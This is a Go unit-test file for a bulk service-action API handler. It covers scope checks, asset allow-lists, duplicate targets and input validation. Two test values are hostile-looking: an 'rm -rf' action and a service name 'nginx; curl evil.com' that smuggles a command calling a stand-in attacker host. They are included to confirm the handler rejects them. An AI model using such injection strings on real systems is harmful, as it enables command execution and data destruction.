package bulkpkg

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/labtether/labtether/internal/apiv2"
	"github.com/labtether/labtether/internal/hubapi/testutil"
)

// stubExec returns an ExecResult with no error for any call.
func stubExec(_ *http.Request, assetID, _ string, _ int) ExecResult {
	return ExecResult{AssetID: assetID, Stdout: "active", ExitCode: 0}
}

func newTestDeps() *Deps {
	return &Deps{
		AuditStore:  testutil.NewAuditStore(),
		ExecOnAsset: stubExec,
	}
}

func TestHandleV2BulkServiceAction_MethodNotAllowed(t *testing.T) {
	d := newTestDeps()
	req := httptest.NewRequest(http.MethodGet, "/api/v2/bulk/service-action", nil)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("expected 405, got %d", rec.Code)
	}
}

func TestHandleV2BulkServiceAction_MissingScope(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"assets:read"}) // bulk:* not granted
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for missing scope, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidAction(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"rm -rf","service":"nginx","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for invalid action, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidServiceName(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx; curl evil.com","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for injection attempt, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_AllTargetsDenied(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, []string{"other-server"}) // srv1/srv2 not allowed
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_MissingFields(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{"empty action", `{"action":"","service":"nginx","targets":["srv1"]}`},
		{"empty service", `{"action":"restart","service":"","targets":["srv1"]}`},
		{"empty targets", `{"action":"restart","service":"nginx","targets":[]}`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			d := newTestDeps()
			req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/json")
			ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
			req = req.WithContext(ctx)
			rec := httptest.NewRecorder()
			d.HandleV2BulkServiceAction(rec, req)
			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
			}
		})
	}
}

func TestHandleV2BulkServiceAction_Success(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"status","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	// Wildcard allowed assets means all targets are permitted.
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil) // nil = wildcard
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_RejectsDuplicateTargets(t *testing.T) {
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	body := `{"action":"status","service":"nginx","targets":["srv1","srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("expected 0 executions, got %d", got)
	}
}

func TestHandleV2BulkServiceAction_RejectsMixedForbiddenTargetsWithoutExecuting(t *testing.T) {
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	body := `{"action":"status","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, []string{"srv1"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("expected 0 executions, got %d", got)
	}
}

func TestHandleV2BulkServiceAction_TrimsTargetsBeforeExecution(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"status","service":"nginx","targets":[" srv1 ","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", rec.Code, rec.Body.String())
	}
	var resp struct {
		Data struct {
			Results map[string]any `json:"results"`
		} `json:"data"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}
	if _, ok := resp.Data.Results["srv1"]; !ok {
		t.Fatalf("expected trimmed target key srv1 in results, got %v", resp.Data.Results)
	}
}

func TestHandleV2BulkServiceAction_ValidActionNames(t *testing.T) {
	for action := range validServiceActions {
		t.Run(action, func(t *testing.T) {
			d := newTestDeps()
			body := `{"action":"` + action + `","service":"nginx","targets":["srv1"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
			ctx = apiv2.ContextWithAllowedAssets(ctx, nil) // wildcard
			req = req.WithContext(ctx)
			rec := httptest.NewRecorder()
			d.HandleV2BulkServiceAction(rec, req)
			if rec.Code != http.StatusOK {
				t.Errorf("action %q: expected 200, got %d: %s", action, rec.Code, rec.Body.String())
			}
		})
	}
}
